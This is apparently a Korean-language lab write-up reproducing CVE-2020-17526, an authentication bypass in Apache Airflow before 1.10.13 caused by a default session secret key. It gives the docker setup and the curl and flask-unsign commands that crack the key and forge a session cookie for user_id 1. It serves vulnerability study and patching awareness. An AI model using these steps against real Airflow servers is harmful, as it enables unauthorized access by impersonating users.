# CVE-2020-17526

**Contributors**

-   [박준서(@DerekAlbertJun)](https://github.com/DerekAlbertJun)

<br/>

### 요약

-   Apache Airflow는 인증을 기본으로 필요로 하지 않지만, 관리자는 인증을 활성화할 수 있음.
-   버전 1.10.13 이전에는 기본 세션 보안 키를 사용하며, 이로 인해 인증이 활성화된 경우 임의의 사용자를 흉내 낼 수 있음.
-   공격자가 세션 키를 해독하여 임의의 사용자로 로그인하는 과정을 다룸.

<br/>

### 환경 구성 및 실행

-   Apache Airflow 1.10.10 서버를 실행하려면 다음 명령을 실행한다.
데이터베이스 초기화
‘docker compose run airflow-init‘

서비스 시작
’docker compose up –d‘
-   서버가 실행되면 웹 브라우저에서 ‘http://your-ip:8080’ 주소로 이동하여 Apache Airflow의 로그인 페이지를 확인할 수 있다. 이 서버는 인증이 필요하다.
-   공격 과정을 수행하기 위해 먼저 로그인 페이지로 이동하고, Cookie에서 세션 문자열을 가져온다.
‘curl –v http://localhost:8080/admin/airflow/login’
-    그런 다음 flask-unsign을 사용하여 세션 키를 해독한다.
‘flask-unsign –u –c [Cookie에서 가져온 세션]’
-    유효한 세션 키인 temporary_key를 얻는다. 이 키를 사용하여 user_id가 1인 새로운 세션을 생성한다.
‘flask-unsign –s —secret temporary_key –c “{’user_id’ : ‘1’, ‘_fresh’ : False, ‘_permanent’ : True}”’
-    마지막으로 이 생성된 세션을 사용하여 성공적으로 로그인한다.


<br/>

### 결과
![](result.png)

<br/>

### 정리

-   이 취약점은 Apache Airflow에서 인증 우회를 허용했기 때문에, 공격자가 인증된 사용자로 위장하여 시스템에 접근할 수 있는 문제를 발생시킵니다. 안전한 웹 서비스 운영을 위해서는 이러한 취약점을 주기적으로 확인하고 패치하는 것이 중요합니다. 
